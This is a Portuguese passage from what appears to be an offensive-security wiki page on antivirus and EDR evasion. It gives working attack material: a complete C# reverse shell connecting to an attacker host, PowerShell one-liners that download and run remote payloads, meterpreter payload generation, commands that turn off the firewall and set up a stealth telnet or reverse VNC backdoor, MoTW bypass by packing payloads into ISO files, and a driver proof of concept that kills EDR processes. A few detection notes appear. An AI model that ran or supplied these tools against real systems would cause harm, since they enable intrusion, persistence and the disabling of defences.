Em vez de mascarar um implant inteiro apenas enquanto ele está inativo, um backend X86 do LLVM modificado pode manter funções selecionadas mascaradas com XOR sempre que estiverem inativas. A PoC Function Peekaboo seleciona nomes demanglados que contêm `REG_`, injeta stubs de entrada/saída independentes de posição ao redor do código de máquina final e emite um único manipulador de mascaramento compartilhado em `.text`; as assinaturas no nível do código-fonte e a convenção de chamada Windows x64 permanecem inalteradas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformação do fluxo de controle do backend

Isso deve ser feito após a seleção e otimização de instruções, pois a transformação precisa abranger **todos os retornos emitidos** e conhecer o layout exato do x86. Um `MachineFunctionPass` de pré-emissão encontra o último `MachineInstr::isReturn()`, exclui-o para que o caminho final caia no epílogo anexado e substitui os retornos anteriores por `JMP_1 handler`. Mantenha qualquer desmontagem de pilha/frame gerada pelo compilador antes de cada retorno; redirecione somente a própria instrução de retorno.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `emitFunctionBodyEnd()` emitem os stubs por função, enquanto `emitEndOfAsmFile()` emite o manipulador. Símbolos compartilhados entre os estágios de emissão permitem que uma ramificação do prólogo aponte para o epílogo emitido posteriormente; para um `je` near emitido manualmente, escreva `0F 84` seguido pela expressão MC de quatro bytes `target - address_after_je`. Chamadas e saltos para o manipulador podem, em vez disso, ser emitidos como objetos `MCInst` (`CALL64pcrel32` e `JMP_1`). Um pass deve retornar `false` para uma função não selecionada quando nada tiver sido alterado; a PoC retorna incorretamente `true` nesse caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadados e inicialização pré-CRT

A PoC coloca uma chave XOR e registros de 16 bytes contendo um ponteiro de função realocado pelo loader, além de um comprimento em tempo de execução, em `.funcmeta`. Embora o campo C seja um `uint32_t`, o manipulador acessa um QWORD no deslocamento `+8` do registro, consumindo o comprimento e seu padding, e avança pelos registros em incrementos de `0x10`. Os nomes de seção PE ocupam apenas oito bytes, então a consulta em tempo de execução encontra `.funcmet`. Um patcher externo adiciona um `.stub` executável, salva o RVA do entry point antigo no stub e redireciona `AddressOfEntryPoint`; o stub PIC obtém a base da imagem de `gs:[0x60]` → `[PEB+0x10]`, percorre as importações PE32+ para resolver um `VirtualProtect` já importado e é executado antes do CRT.<sup>[[38]](#references)[[39]](#references)</sup>

A inicialização define um sentinel em `gs:[0xE8]` e chama todas as funções dos metadados. Seu prólogo, que permanece legível, registra o início da função em `gs:[0xF0]`, detecta o sentinel e ignora o corpo ainda descriptografado. O epílogo então usa `call handler`; depois que o manipulador salva 13 registradores (`0x68` bytes), o endereço de retorno em `[rsp+0x68]` corresponde ao fim da função transformada, permitindo gravar `end - start` no registro de metadados. O stub limpa o sentinel e salta para `ImageBase + original_entry_point_RVA` depois que todos os corpos tiverem sido mascarados.<sup>[[38]](#references)[[39]](#references)</sup>

Durante uma chamada normal, o prólogo chama o mesmo manipulador simétrico para decodificar o corpo. O caminho final cai no epílogo anexado, enquanto cada retorno anterior salta diretamente para o manipulador compartilhado. O epílogo normal também usa `jmp handler` em vez de `call`; assim, depois de mascarar novamente o corpo, o `ret` do manipulador consome o endereço de retorno do chamador original e preserva o resultado da função em `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva de mascaramento e indicadores de análise

O manipulador encontra o registro atual, ignora o prólogo visível de tamanho fixo (`0x46` bytes nesta compilação), altera o restante para `PAGE_EXECUTE_READWRITE`, aplica XOR byte a byte usando o byte menos significativo da chave e, em seguida, define a proteção como `PAGE_EXECUTE_READ`. Assim, o mesmo loop decodifica na entrada e codifica em cada saída normal.<sup>[[38]](#references)[[39]](#references)</sup>

Indicadores de alta confiabilidade para este projeto incluem:<sup>[[38]](#references)[[39]](#references)</sup>

- um entry point dentro de um `.stub` executável e uma seção `.funcmet` contendo uma chave e ponteiros `.text` realocados;
- análise pré-CRT do PEB, da tabela de importações e da tabela de seções, seguida de chamadas por cada ponteiro dos metadados;
- prólogos PIC `call`/`pop` idênticos e muitos pontos de retorno redirecionados para um único manipulador;
- gravações em `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguidas de transições repetidas de `VirtualProtect` e gravações de XOR byte a byte em páginas executáveis respaldadas pela imagem.

Isso é uma forma de evasão de scanners de memória, não de proteção criptográfica: o arquivo corrigido ainda contém o corpo original em texto claro, e um debugger pode interromper a execução em `VirtualProtect` ou no loop XOR e despejar a função ativa. O XOR de um único byte, os metadados legíveis e o limite fixo `0x46` também tornam a recuperação offline simples.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Os slots TEB da PoC são locais à thread, mas as páginas de código modificadas são globais ao processo. Assim, entradas concorrentes ou recursivas podem alternar novamente as instruções enquanto outra invocação está sendo executada; exceções e saídas não locais também podem ignorar o mascaramento de retorno. Uma implementação robusta deve sincronizar as transições, restaurar a proteção realmente retornada por `lpflOldProtect`, evitar comprimentos de stub codificados diretamente, auditar os caminhos `call` e `jmp` quanto ao alinhamento da pilha x64 e chamar `FlushInstructionCache` após reescrever bytes executáveis. A Microsoft deixa explicitamente a cargo do chamador garantir a coerência do cache de instruções quando o código executável é modificado.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Você talvez já tenha visto esta tela ao baixar e executar alguns executáveis da internet.

O Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicativos potencialmente maliciosos.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com base na reputação: aplicativos baixados com pouca frequência acionam o SmartScreen, que alerta o usuário final e impede a execução do arquivo (embora ainda seja possível executá-lo clicando em Mais informações -> Executar mesmo assim).

**MoTW** (Mark of The Web) é um [Alternate Data Stream do NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) chamado Zone.Identifier, criado automaticamente ao baixar arquivos da internet, junto com a URL de origem do download.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier de um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante observar que executáveis assinados com um certificado de assinatura **confiável** **não acionam o SmartScreen**.

Uma maneira muito eficaz de impedir que seus payloads recebam a marca Mark of The Web é empacotá-los em algum tipo de contêiner, como um ISO. Isso ocorre porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **que não sejam NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evadir o Mark-of-the-Web.

Exemplo de uso:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Aqui está uma demonstração de bypass do SmartScreen empacotando payloads em arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging do Windows que permite que aplicativos e componentes do sistema **registrem eventos**. No entanto, produtos de segurança também podem usá-lo para monitorar e detectar atividades maliciosas.

Assim como é possível desabilitar o AMSI (fazer bypass), também é possível fazer com que a função **`EtwEventWrite`** do processo em user space retorne imediatamente, sem registrar nenhum evento. Isso é feito aplicando patch na função em memória para que ela retorne imediatamente, desabilitando efetivamente o logging do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflexão de Assembly C#

Carregar binários C# em memória já é uma técnica conhecida há bastante tempo e ainda é uma ótima maneira de executar suas ferramentas de post-exploitation sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória, sem tocar no disco, só precisaremos nos preocupar em aplicar patch no AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc etc.) já oferece a capacidade de executar assemblies C# diretamente na memória, mas há diferentes maneiras de fazer isso:

- **Fork\&Run**

Isso envolve **iniciar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar o código malicioso e, quando terminar, encerrar o novo processo. Isso tem vantagens e desvantagens. A vantagem do método fork and run é que a execução ocorre **fora** do processo do nosso Beacon implant. Isso significa que, se algo der errado durante nossa ação de post-exploitation ou ela for detectada, há uma **chance muito maior** de nosso **implant sobreviver.** A desvantagem é que há uma **chance maior** de ser detectado por **detecções comportamentais**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no próprio processo**. Assim, você evita criar um novo processo e submetê-lo à análise do AV, mas a desvantagem é que, se algo der errado durante a execução do payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode falhar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser saber mais sobre o carregamento de assemblies C#, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar assemblies C# **a partir do PowerShell**. Confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [o vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Reempacotamento de ferramentas .NET em WebAssembly com NativeAOT (WasmForge)

As técnicas comuns de `execute-assembly` mantêm MSIL reconhecível e, eventualmente, inicializam um CLR. **WasmForge** muda a base de execução: migra um projeto C# para o alvo experimental WASI do NativeAOT-LLVM, compila-o antecipadamente para WebAssembly e incorpora esse módulo em um host PE para Windows baseado em Wazero. O processo resultante não precisa do CLR, do JIT nem do host `dotnet` do alvo; portanto, regras baseadas apenas em nomes de assemblies gerenciados, carregamento do CLR, AMSI ou ETW para .NET perdem visibilidade direta. Esta é uma técnica de evasão/empacotamento, não um bypass de limite de privilégio — o guest mantém as permissões e o comportamento observável do SO da ferramenta original.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilando um projeto C#

O caminho de compilação recomendado é o ambiente Docker do projeto, pois ele inclui o SDK do .NET 10, o workload NativeAOT-LLVM, o WASI SDK 24.0, o linker e as dependências de assinatura. Um arquivo `.csproj` é detectado automaticamente; a compilação em uma única etapa realiza a migração, a aplicação de patches de compatibilidade, a compilação para WASM, a criação do PE e a assinatura.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Para solucionar problemas ou revisar o código gerado, divida o processo em `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` e, por fim, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. A imagem de build também usa um wrapper `wasm-component-ld` para evitar a codificação de componente do WASI Preview 2 e produzir o módulo simples esperado pelo runtime incorporado.<sup>[[44]](#references)[[45]](#references)</sup>

### Integração de wasm32 C# com x64 Win32

Esta não é uma recompilação transparente. NativeAOT-WASI não oferece ou altera recursos do BCL voltados ao Windows, e um guest wasm32 normalmente aloca slots de ponteiro de quatro bytes, enquanto APIs x64 podem retornar ponteiros de oito bytes. O WasmForge resolve ambos os problemas com as seguintes camadas geradas:<sup>[[44]](#references)</sup>

1. Um patcher de código-fonte corrige diferenças semânticas específicas do AOT e redireciona chamadas não compatíveis de registry, pipes, WMI, identidade, serviços de diretório, versão de arquivo, LSA e similares para helpers `Wf*`.
2. Um scanner de P/Invoke gera mapeamentos `DirectPInvoke` do NativeAOT para que chamadas `[DllImport]` sejam vinculadas a símbolos de bridge C vinculados, em vez de carregar dinamicamente a DLL declarada dentro do guest.
3. Ponteiros vinculados ao host usam `ulong` em C# e `uint64_t` em C. Um dispatcher genérico encaminha a chamada para o handler Win32 do host; um `out8_mask` marca slots de saída genuínos de oito bytes cujas metades superiores devem ser preservadas. Saídas não marcadas no formato wasm32 usam proteção de snapshot/restauração para impedir que uma gravação x64 corrompa os quatro bytes adjacentes.
4. Bridges dedicadas do host tratam operações que não se encaixam no dispatch genérico de syscall, como acesso ao cache de tickets LSA, operações Kerberos/BCrypt com resultados estruturados, tráfego TCP KDC e consultas LDAP.

Por exemplo, um wrapper para `version.dll!VerQueryValueW` passa quatro endereços do host e define os bits 2 e 3 (`0xC`), pois o ponteiro de valor e o comprimento são slots de saída de oito bytes. O próprio wrapper permanece genérico e delega o nome da DLL, o nome da exportação, os argumentos e a máscara para `wf_call_v2`; o host realiza a tradução de ponteiros e invoca a API nativa.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limitações e pontos de detecção

Código com uso intenso de reflection, carregamento dinâmico de assemblies, callbacks nativos arbitrários e estruturas x64 complexas retornadas à memória WASM ainda podem exigir patches específicos para cada ferramenta ou falhar por completo. Sockets genéricos do WASI Preview 2 também podem chegar a stubs no-op, por isso as ferramentas compatíveis usam shims de host específicos para cada protocolo. Valide cada comando em relação a uma build nativa, em vez de presumir paridade de recursos.<sup>[[44]](#references)[[45]](#references)</sup>

A técnica desloca a telemetria, em vez de tornar o payload invisível. A detecção pode se voltar para um PE que contenha ou materialize um módulo WASM, comportamento semelhante ao runtime Wazero, alocação e cópia incomuns de memória entre host e guest, dispatch genérico direto para Win32, anomalias de assinatura e de recursos do PE, além das chamadas de API e do tráfego de rede resultantes. Portanto, a ausência de eventos de carregamento do CLR, AMSI ou .NET ETW não deve ser tratada como evidência de que um processo é benigno.<sup>[[44]](#references)</sup>

## Usando outras linguagens de programação

Conforme proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no compartilhamento SMB controlado pelo atacante**.

Ao permitir o acesso aos binários do interpretador e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repositório indica que o Defender ainda verifica os scripts, mas, ao utilizar Go, Java, PHP etc., temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com scripts aleatórios de reverse shell não ofuscados nessas linguagens tiveram resultados positivos.

## Re-hosting de WebAssembly para evasão de análise estática

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

O token stomping manipula o token de acesso de um produto de segurança, como um EDR ou AV. Reduzir os privilégios do token pode manter o processo em execução, impedindo-o de realizar ações privilegiadas de inspeção ou remediação.

Para evitar isso, o Windows poderia **impedir que processos externos** obtenham handles dos tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usando software confiável

### Chrome Remote Desktop

Conforme descrito [**nesta publicação do blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil implantar o Chrome Remote Desktop no PC de uma vítima e usá-lo para assumir o controle da máquina e manter a persistência:<sup>[[35]](#references)</sup>
1. Baixe o programa em https://remotedesktop.google.com/, clique em "Set up via SSH" e, em seguida, no arquivo MSI para Windows para baixar o MSI.
2. Execute o instalador silenciosamente na máquina da vítima (requer privilégios de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte à página do Chrome Remote Desktop e clique em next. O assistente solicitará autorização; clique no botão Authorize para continuar.
4. Execute o comando fornecido com os ajustes necessários: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (o parâmetro `--pin` define o PIN sem usar a GUI).
 

## Evasão avançada

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

A evasão é um tema muito complexo; às vezes, é preciso levar em conta diversas fontes de telemetria em um único sistema, por isso é praticamente impossível permanecer completamente indetectável em ambientes maduros.

Cada ambiente que você enfrentar terá seus próprios pontos fortes e fracos.

Recomendo muito assistir a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94) para conhecer melhor as técnicas avançadas de evasão.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta também é uma ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre evasão em profundidade.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas antigas**

### **Verificar quais partes o Defender detecta como maliciosas**

Você pode usar o [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **remove partes do binário** até **identificar qual parte o Defender está detectando como maliciosa** e a separa para você.\
Outra ferramenta que faz **a mesma coisa é** o [**avred**](https://github.com/dobin/avred), que oferece o serviço em um site aberto: [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Até o Windows 10, todas as versões do Windows vinham com um **servidor Telnet** que você podia instalar (como administrador) executando:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Faça com que ele **inicie** quando o sistema for iniciado e **execute-o** agora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Alterar a porta do telnet** (stealth) e desativar o firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Baixe em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads bin, não o instalador)

**NO HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Ative a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo _**UltraVNC.ini**_ recém-criado para dentro da **vítima**

#### **Conexão reversa**

O **atacante** deve **executar dentro** do seu **host** o binário `vncviewer.exe -listen 5900` para que ele fique **preparado** para receber uma **conexão VNC** reversa. Em seguida, dentro da **vítima**: inicie o daemon winvnc com `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVISO:** Para manter o stealth, não faça algumas coisas

- Não inicie o `winvnc` se ele já estiver em execução ou você acionará um [pop-up](https://i.imgur.com/1SROTTl.png). Verifique se ele está em execução com `tasklist | findstr winvnc`
- Não inicie o `winvnc` sem `UltraVNC.ini` no mesmo diretório ou a [janela de configuração](https://i.imgur.com/rfMQWcf.png) será aberta
- Não execute `winvnc -h` para obter ajuda ou você acionará um [pop-up](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Baixe em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dentro do GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Agora **inicie o listener** com `msfconsole -r file.rc` e **execute** o **payload XML** com:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro Revershell em C#

Compile-o com:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Use-o com:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# usando compilador

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando Python para um exemplo de criação de injetores:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Traga Seu Próprio Driver Vulnerável (BYOVD) – Eliminando AV/EDR a partir do Espaço do Kernel

O Storm-2603 usou um pequeno utilitário de console conhecido como **Antivirus Terminator** para desativar as proteções dos endpoints antes de instalar ransomware. A ferramenta traz seu **próprio driver vulnerável, mas *assinado*** e o explora para executar operações privilegiadas no kernel que nem mesmo os serviços de AV Protected-Process-Light (PPL) conseguem bloquear.<sup>[[12]](#references)</sup>

Principais conclusões
1. **Driver assinado**: O arquivo enviado para o disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys`, do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele é carregado mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   A primeira linha registra o driver como um **serviço do kernel** e a segunda o inicia, tornando `\\.\ServiceMouse` acessível a partir do userland.
3. **IOCTLs expostos pelo driver**
   | Código IOCTL | Recurso                                |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Encerrar um processo arbitrário por PID (usado para encerrar serviços do Defender/EDR) |
   | `0x990000D0` | Excluir um arquivo arbitrário do disco |
   | `0x990001D0` | Descarregar o driver e remover o serviço |

   Prova de conceito mínima em C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Por que funciona**: BYOVD ignora completamente as proteções em user-mode; o código executado no kernel pode abrir processos *protegidos*, encerrá-los ou adulterar objetos do kernel, independentemente de PPL/PP, ELAM ou outros recursos de hardening.

Detecção / Mitigação
• Ative a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows se recuse a carregar `AToolsKrnl64.sys`.
• Monitore a criação de novos serviços de *kernel* e gere alertas quando um driver for carregado de um diretório com permissão de gravação para todos ou não estiver na allow-list.
• Procure handles de user-mode para objetos de dispositivo personalizados, seguidos por chamadas suspeitas a `DeviceIoControl`.

### Contornando as verificações de postura do Zscaler Client Connector por meio de patch de binários em disco

